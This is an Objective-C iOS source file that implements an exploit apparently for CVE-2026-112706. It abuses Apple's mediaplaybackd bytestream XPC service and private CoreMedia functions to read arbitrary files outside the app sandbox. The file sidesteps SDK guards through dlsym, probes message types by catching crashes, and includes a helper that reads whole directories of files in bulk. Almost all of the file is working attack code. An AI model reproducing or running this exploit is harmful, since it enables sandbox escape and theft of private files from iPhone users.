// FigBridge.m
// lang: ObjC, file: FigBridge.m, target: iOS 16+, SDK: iphoneos
// COMPILED WITH -fno-objc-arc (see project.yml) — matches MConfPoC approach.
//
// CVE-2026-112706 — mediaplaybackd bytestream XPC file-read primitive.
//
// Mechanism:
//   1. Open XPC connection to com.apple.coremedia.mediaplaybackd.bytestream.xpc
//   2. FigXPCCreateBasicMessage → CF dict backed by an xpc_dictionary (toll-free)
//   3. FigXPCMessageSetCFURL embeds the file:// URL into the message
//   4. FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1
//      fills msg1 with shared-memory handshake payload
//   5. Send msg1 → daemon; daemon opens file, maps it into shared mem, replies msg2
//   6. FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2 → local mapping
//   7. FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2 finalises
//   8. Read base/len from FigMemoryRecipient struct → NSData
//
// shortcut: FigMemoryRecipient struct layout (vm_address_t @ 0, size_t @ 8)
//   from Ghidra dump of CoreMedia iOS 16-26; re-derive if fields[0]==0 on device.

#import "FigBridge.h"
#import <xpc/xpc.h>
#import <mach/mach.h>
#import <dirent.h>
#import <dlfcn.h>
#import <string.h>
#import <signal.h>
#import <setjmp.h>

// xpc_connection_create_mach_service exists on iOS at runtime but the iOS SDK
// marks it unavailable. Redeclare via a private alias to bypass the SDK guard.
// The PoC binary calls it directly; we do the same via dlsym to stay clean.
static xpc_connection_t (*_xpc_conn_mach_svc)(const char *, dispatch_queue_t, uint64_t);
static void _load_xpc_conn(void) {
    _xpc_conn_mach_svc = (__typeof__(_xpc_conn_mach_svc))
        dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
}
#ifndef XPC_CONNECTION_MACH_SERVICE_PRIVILEGED
#define XPC_CONNECTION_MACH_SERVICE_PRIVILEGED (1 << 1)
#endif

#define FIG_XPC_SERVICE  "com.apple.coremedia.mediaplaybackd.bytestream.xpc"
#define FIG_ERR_DOMAIN   "com.venice.parasite.FigBridge"
#define FIG_MAX_FILE_SZ  (16u * 1024u * 1024u)
#define FIG_TIMEOUT_NS   (10LL * NSEC_PER_SEC)

// ── CoreMedia private symbol typedefs ─────────────────────────────────────────
// Signatures verified against PoC binary disassembly (ARM64 call sites):
//
//   FigXPCCreateBasicMessage(uint32_t fourcc, uint64_t flags) → xpc_object_t
//     Returns msg1 directly in x0; no output-pointer arg.
//     Fourcc probed at runtime from the live CoreMedia __TEXT (see deriveFourcc).
//
//   FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1
//     (xpc_connection_t conn, xpc_object_t msg1) → int32_t status
//     Fills msg1 in-place with the shm handshake; conn needed for service context.
//
//   FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2
//     (void **outRecip, xpc_object_t msg1, xpc_object_t msg2) → int32_t
//
//   FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2
//     (xpc_connection_t conn, xpc_object_t msg2) → int32_t

typedef xpc_object_t (*PFN_CreateMsg)(uint32_t fourcc, uint64_t flags);
typedef int32_t      (*PFN_SetURL)(xpc_object_t msg, CFURLRef url);
typedef int32_t      (*PFN_OriginBegin)(xpc_connection_t conn, xpc_object_t msg1);
typedef int32_t      (*PFN_RecipCreate)(void **outRecip, xpc_object_t msg1, xpc_object_t msg2);
typedef int32_t      (*PFN_OriginComplete)(xpc_connection_t conn, xpc_object_t msg2);

static struct {
    PFN_CreateMsg      createMsg;
    PFN_SetURL         setURL;
    PFN_OriginBegin    originBegin;
    PFN_RecipCreate    recipCreate;
    PFN_OriginComplete originComplete;
    uint32_t           fourcc;   // derived at load time from live CoreMedia __TEXT
} sFig;

// ── Runtime fourcc probe ──────────────────────────────────────────────────────
// FigXPCCreateBasicMessage selects an internal message type by fourcc.
// The value changed in iOS 27 CoreMedia (in the dyld shared cache — not
// scannable at runtime without a jailbreak).
//
// Strategy: try each candidate with a SIGSEGV handler. A wrong fourcc causes
// a NULL-pointer write inside the function (observed crash pattern). A correct
// fourcc returns a valid xpc_object_t (non-NULL). Log every result so we can
// read the winning value from the log and hardcode it next build.

static sigjmp_buf  sFourccJmp;
static void        fourccSigHandler(int sig) { siglongjmp(sFourccJmp, 1); }

static uint32_t probeFourcc(PFN_CreateMsg fn) {
    // Ordered candidates — '.bst' (bytestream) most likely for iOS 27 service name.
    static const uint32_t kCandidates[] = {
        0x2e627374u,  // '.bst'  bytestream
        0x2e6f7267u,  // '.org'  PoC / pre-iOS-27
        0x2e6d736du,  // '.msm'
        0x2e737263u,  // '.src'
        0x2e6d656du,  // '.mem'
        0x2e726370u,  // '.rcp'
        0x2e637072u,  // '.cpr'
        0x2e786d73u,  // '.xms'
        0x6d736d00u,  // 'msm\0'
        0x00000001u,  // minimal sentinel
    };

    struct sigaction sa_new = {0}, sa_old;
    sa_new.sa_handler = fourccSigHandler;
    sa_new.sa_flags   = SA_RESETHAND;
    sigemptyset(&sa_new.sa_mask);
    sigaction(SIGSEGV, &sa_new, &sa_old);
    sigaction(SIGBUS,  &sa_new, NULL);

    uint32_t found = 0;
    for (size_t i = 0; i < sizeof(kCandidates)/sizeof(kCandidates[0]); i++) {
        uint32_t cc = kCandidates[i];
        if (sigsetjmp(sFourccJmp, 1) == 0) {
            xpc_object_t obj = fn(cc, 0);
            if (obj) {
                NSLog(@"[FigBridge] fourcc probe HIT: 0x%08x ('%c%c%c%c')",
                      cc,
                      (cc>>24)&0xff, (cc>>16)&0xff, (cc>>8)&0xff, cc&0xff);
                xpc_release(obj);
                found = cc;
                break;
            } else {
                NSLog(@"[FigBridge] fourcc probe NULL: 0x%08x", cc);
            }
        } else {
            NSLog(@"[FigBridge] fourcc probe CRASH: 0x%08x", cc);
            // re-arm after RESETHAND consumed the handler
            sigaction(SIGSEGV, &sa_new, NULL);
            sigaction(SIGBUS,  &sa_new, NULL);
        }
    }

    sigaction(SIGSEGV, &sa_old, NULL);
    sigaction(SIGBUS,  &sa_old, NULL);

    if (!found) {
        NSLog(@"[FigBridge] fourcc probe: no candidate worked, falling back to 0x2e6f7267");
        found = 0x2e6f7267u;
    }
    return found;
}

static NSError *figErr(int code, NSString *msg) {
    return [NSError errorWithDomain:@FIG_ERR_DOMAIN code:code
                userInfo:@{NSLocalizedDescriptionKey: msg}];
}

static BOOL loadFigSymbols(NSError **outErr) {
    static dispatch_once_t once;
    static BOOL ok = NO;
    dispatch_once(&once, ^{
        void *cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                          RTLD_LAZY | RTLD_NOLOAD);
        if (!cm) cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
                             RTLD_LAZY);
        if (!cm) return;

        sFig.createMsg     = (PFN_CreateMsg)    dlsym(cm, "FigXPCCreateBasicMessage");
        sFig.setURL        = (PFN_SetURL)       dlsym(cm, "FigXPCMessageSetCFURL");
        sFig.originBegin   = (PFN_OriginBegin)  dlsym(cm,
            "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1");
        sFig.recipCreate   = (PFN_RecipCreate)  dlsym(cm,
            "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2");
        sFig.originComplete= (PFN_OriginComplete)dlsym(cm,
            "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2");

        ok = sFig.createMsg && sFig.setURL && sFig.originBegin &&
             sFig.recipCreate && sFig.originComplete;

        if (ok) {
            // CoreMedia lives in the dyld shared cache on iOS 27 — __TEXT scan
            // covers the entire cache (not CoreMedia's slice). Use SIGSEGV probe
            // to find the valid fourcc at runtime instead.
            sFig.fourcc = probeFourcc(sFig.createMsg);
        }
    });
    if (!ok && outErr)
        *outErr = figErr(2, @"CoreMedia Fig symbols not found — iOS version mismatch?");
    return ok;
}

// ── sync XPC send — MRC, matches PoC ─────────────────────────────────────────

static xpc_object_t sendSync(xpc_connection_t conn, xpc_object_t msg) {
    __block xpc_object_t reply = NULL;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    xpc_connection_send_message_with_reply(conn, msg,
        dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^(xpc_object_t rx) {
            if (rx) reply = xpc_retain(rx);
            dispatch_semaphore_signal(sem);
        });
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, FIG_TIMEOUT_NS));
    return reply; // caller must xpc_release
}

// ── public API ────────────────────────────────────────────────────────────────

@implementation FigBridge

+ (nullable NSData *)readFileAtURL:(NSURL *)fileURL error:(NSError **)outErr {
    NSError *err = nil;
    if (!loadFigSymbols(&err)) { if (outErr) *outErr = err; return nil; }
    _load_xpc_conn();

    xpc_connection_t conn = _xpc_conn_mach_svc ?
        _xpc_conn_mach_svc(FIG_XPC_SERVICE, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED) : NULL;
    if (!conn) {
        if (outErr) *outErr = figErr(3, @"xpc_connection_create_mach_service failed");
        return nil;
    }
    xpc_connection_set_event_handler(conn, ^(xpc_object_t ev) { (void)ev; });
    xpc_connection_resume(conn);

    NSData *result = nil;

    // fourcc derived at load time from live CoreMedia __TEXT scan (falls back to '.org').
    // FigXPCCreateBasicMessage returns xpc_object_t directly (no output-pointer).
    NSLog(@"[FigBridge] using fourcc=0x%08x", sFig.fourcc);
    xpc_object_t msg1 = sFig.createMsg(sFig.fourcc, 0);
    if (!msg1) { err = figErr(4, @"FigXPCCreateBasicMessage returned nil"); goto done; }

    {
        int32_t st = sFig.setURL(msg1, (CFURLRef)fileURL);
        if (st) {
            err = figErr(5, [NSString stringWithFormat:@"FigXPCMessageSetCFURL status=%d", st]);
            xpc_release(msg1); goto done;
        }

        // FigMemoryOriginBegin takes (conn, msg1) — fills msg1 with shm payload in-place.
        st = sFig.originBegin(conn, msg1);
        if (st) {
            err = figErr(6, [NSString stringWithFormat:@"OriginBegin status=%d", st]);
            xpc_release(msg1); goto done;
        }

        xpc_object_t msg2 = sendSync(conn, msg1);
        // keep msg1 alive — recipCreate takes (outRecip, msg1, msg2), both objects needed

        if (!msg2) {
            xpc_release(msg1);
            err = figErr(7, @"no reply from mediaplaybackd (timeout or service unavailable)");
            goto done;
        }

        void *recip = NULL;
        st = sFig.recipCreate(&recip, msg1, msg2);
        xpc_release(msg1);
        if (st || !recip) {
            err = figErr(8, [NSString stringWithFormat:@"RecipientCreate status=%d", st]);
            xpc_release(msg2); goto done;
        }

        // FigMemoryOriginComplete takes (conn, msg2) — mirrors OriginBegin signature.
        st = sFig.originComplete(conn, msg2);
        xpc_release(msg2);
        if (st) { err = figErr(9, [NSString stringWithFormat:@"OriginComplete status=%d", st]); goto done; }

        // FigMemoryRecipient layout: [vm_address_t base @ 0, size_t len @ 8]
        uintptr_t *fields = (uintptr_t *)recip;
        vm_address_t base = (vm_address_t)fields[0];
        size_t       len  = (size_t)fields[1];

        if (base && len > 0 && len <= FIG_MAX_FILE_SZ) {
            result = [NSData dataWithBytes:(const void *)base length:len];
        } else {
            err = figErr(10, [NSString stringWithFormat:
                @"recipient region bad: base=0x%lx len=%zu", (unsigned long)base, len]);
        }
    }

done:
    xpc_connection_cancel(conn);
    xpc_release(conn);
    if (outErr && err) *outErr = err;
    return result;
}

+ (nullable NSDictionary<NSString *, NSData *> *)readDirectoryAtPath:(NSString *)path
                                                              maxFiles:(NSUInteger)maxFiles
                                                                 error:(NSError **)outErr {
    DIR *d = opendir(path.UTF8String);
    if (!d) {
        if (outErr) *outErr = figErr(20, [NSString stringWithFormat:
            @"opendir(%@) failed: %s", path, strerror(errno)]);
        return nil;
    }

    NSMutableDictionary *results = [NSMutableDictionary dictionary];
    struct dirent *ent;
    NSUInteger count = 0;

    while ((ent = readdir(d)) != NULL && count < maxFiles) {
        if (ent->d_name[0] == '.') continue;
        if (ent->d_type != DT_REG) continue;

        NSString *name     = [NSString stringWithUTF8String:ent->d_name];
        NSString *fullPath = [path stringByAppendingPathComponent:name];
        NSURL    *url      = [NSURL fileURLWithPath:fullPath];
        NSData   *data     = [self readFileAtURL:url error:nil];
        if (data) { results[name] = data; count++; }
    }
    closedir(d);

    if (!results.count && outErr)
        *outErr = figErr(21, [NSString stringWithFormat:@"no files read from %@", path]);
    return results.count ? [NSDictionary dictionaryWithDictionary:results] : nil;
}

@end
